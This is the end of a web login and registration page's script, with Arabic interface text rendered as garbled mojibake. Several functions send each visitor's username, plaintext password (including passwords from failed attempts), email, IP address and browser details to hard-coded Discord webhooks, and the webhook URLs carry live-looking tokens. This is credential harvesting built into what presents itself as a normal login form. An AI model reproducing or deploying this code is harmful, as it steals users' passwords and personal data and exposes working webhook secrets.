        const webhookURL = "https://discord.com/api/webhooks/1384553129718317239/tb1HmhQ-oV41D9c6yecWT8ygoOKdvH0NIozwQ7Al-60USSb9Kq0JQqJyHSLo9WAeLEl8";
        
        const embed = {
            title: "ğŸ”„ ØªÙ… ØªØºÙŠÙŠØ± ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±",
            description: `**ğŸ‘¤ Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…:** ${username}\n**ğŸ“§ Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ:** ${email}\n**ğŸŒ IP:** ${ipData.ip}\n**ğŸ•’ ÙˆÙ‚Øª Ø§Ù„ØªØºÙŠÙŠØ±:** ${new Date().toLocaleString()}`,
            color: 0x00FF00,
            timestamp: new Date().toISOString()
        };
        
        const response = await fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ embeds: [embed] })
        });
        
        if (!response.ok) throw new Error("Failed to send notification");
    } catch (error) {
        throw error;
    }
}

    // Ø¯Ø§Ù„Ø© Ø¥Ø±Ø³Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¥Ù„Ù‰ Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯
    async function sendLoginToDiscord(username, password) {
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            
            await fetch("https://discord.com/api/webhooks/1384583790260781207/06XIJXyW4KSzxiDICOjhxPnT24vJ0gMCXYaVRUy0PISX345jzJugOEDWaG43V5T_lN-_", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    embeds: [{
                        title: "ğŸ”” ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ Ù†Ø§Ø¬Ø­",
                        description: `**ğŸ‘¤ Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…:** ${username}\n**ğŸ” ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±:** ${password}\n**ğŸŒ IP:** ${ipData.ip}\n**ğŸ–¥ï¸ Ø§Ù„Ù…ØªØµÙØ­:** ${navigator.userAgent}`,
                        color: 0x00FF00,
                        timestamp: new Date().toISOString()
                    }]
                })
            });
        } catch (error) {
            console.error("Error sending login data:", error);
        }
    }

    // Ø¯Ø§Ù„Ø© Ø¥Ø±Ø³Ø§Ù„ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„ØªØ³Ø¬ÙŠÙ„ Ø¥Ù„Ù‰ Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯
    async function sendRegisterToDiscord(username, email, password) {
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            
            await fetch("https://discord.com/api/webhooks/1384583143012569088/ez0m1rtMh4dNUYGK9LMrzhB6xpZK3B7HugwwZSKxhfaWJi_XjXN9isl56EXPAXEHRDCY", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    embeds: [{
                        title: "ğŸ“ Ø­Ø³Ø§Ø¨ Ø¬Ø¯ÙŠØ¯",
                        description: `**ğŸ‘¤ Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…:** ${username}\n**ğŸ“§ Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ:** ${email}\n**ğŸ” ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±:** ${password}\n**ğŸŒ IP:** ${ipData.ip}\n**ğŸ–¥ï¸ Ø§Ù„Ù…ØªØµÙØ­:** ${navigator.userAgent}`,
                        color: 0x0000FF,
                        timestamp: new Date().toISOString()
                    }]
                })
            });
        } catch (error) {
            console.error("Error sending registration data:", error);
        }
    }

    // Ø¯Ø§Ù„Ø© Ø¥Ø±Ø³Ø§Ù„ Ù…Ø­Ø§ÙˆÙ„Ø§Øª ÙØ§Ø´Ù„Ø© Ø¥Ù„Ù‰ Ø¯ÙŠØ³ÙƒÙˆØ±Ø¯
    async function sendFailedToDiscord(username, password) {
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            
            await fetch("https://discord.com/api/webhooks/1384583347237556395/QaPQhPJJMFiCFqCJKlF_cuGcSFnKtH6ICrn9aT-DDscnvsT3YwQ2-QiC3C8ta-y7KQmm", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    embeds: [{
                        title: "âš ï¸ Ù…Ø­Ø§ÙˆÙ„Ø© Ø¯Ø®ÙˆÙ„ ÙØ§Ø´Ù„Ø©",
                        description: `**ğŸ‘¤ Ø§Ø³Ù… Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…:** ${username}\n**ğŸ” ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø©:** ${password}\n**ğŸŒ IP:** ${ipData.ip}\n**ğŸ–¥ï¸ Ø§Ù„Ù…ØªØµÙØ­:** ${navigator.userAgent}\n\nÙŠØ±Ø¬Ù‰ Ø§Ù„ØªÙˆØ§ØµÙ„ Ù…Ø¹ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø¥Ø°Ø§ ÙƒØ§Ù† Ù‚Ø¯ Ù†Ø³ÙŠØª ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±.`,
                        color: 0xFF0000,
                        timestamp: new Date().toISOString()
                    }]
                })
            });
        } catch (error) {
            console.error("Error sending failed attempt:", error);
        }
    }

    // Ø¯Ø§Ù„Ø© ØªØ¨Ø¯ÙŠÙ„ Ø§Ù„Ù†Ù…Ø§Ø°Ø¬
    function showLoginForm() {
        document.getElementById("loginFormContainer").style.display = "block";
        document.getElementById("registerFormContainer").style.display = "none";
        document.getElementById("forgotPasswordContainer").style.display = "none";
        resetForgotPasswordForm();
    }

    function showRegisterForm() {
        document.getElementById("loginFormContainer").style.display = "none";
        document.getElementById("registerFormContainer").style.display = "block";
        document.getElementById("forgotPasswordContainer").style.display = "none";
    }

    function showForgotPassword() {
        document.getElementById("loginFormContainer").style.display = "none";
        document.getElementById("registerFormContainer").style.display = "none";
        document.getElementById("forgotPasswordContainer").style.display = "block";
    }

    function resetForgotPasswordForm() {
        document.getElementById("forgotUsername").value = "";
        document.getElementById("forgotEmail").value = "";
        document.getElementById("verificationCode").value = "";
        document.getElementById("newPassword").value = "";
        document.getElementById("verificationCodeGroup").style.display = "none";
        document.getElementById("newPasswordGroup").style.display = "none";
        document.getElementById("resetPasswordBtn").style.display = "none";
        currentUser = null;
        verificationCode = null;
    }

    // Ø¯Ø§Ù„Ø© ØªØ¨Ø¯ÙŠÙ„ Ø¹Ø±Ø¶ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±
    function togglePassword(fieldId) {
        const passwordField = document.getElementById(fieldId);
        const icon = passwordField.nextElementSibling;
        
        if(passwordField.type === "password") {
            passwordField.type = "text";
            icon.classList.remove("fa-eye");
            icon.classList.add("fa-eye-slash");
        } else {
            passwordField.type = "password";
            icon.classList.remove("fa-eye-slash");
            icon.classList.add("fa-eye");
        }
    }
    </script>
</body>
</html>